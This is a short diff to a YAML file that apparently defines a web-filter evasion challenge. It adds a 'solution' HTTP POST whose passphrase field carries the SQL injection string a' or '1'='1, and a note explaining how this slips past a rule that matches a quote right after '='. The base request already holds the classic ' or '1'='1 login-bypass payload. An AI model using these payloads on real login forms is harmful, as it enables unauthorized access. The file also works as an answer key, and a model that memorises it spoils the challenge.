@@ -17,6 +17,16 @@ base_request: |-
 
   passphrase=' or '1'='1
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Content-Length: 23
+  Content-Type: application/x-www-form-urlencoded
+
+  passphrase=a' or '1'='1
+
+solution_note: passphrase=' => passphrase=a'
+
 rules:
 # ' right after =
 - >
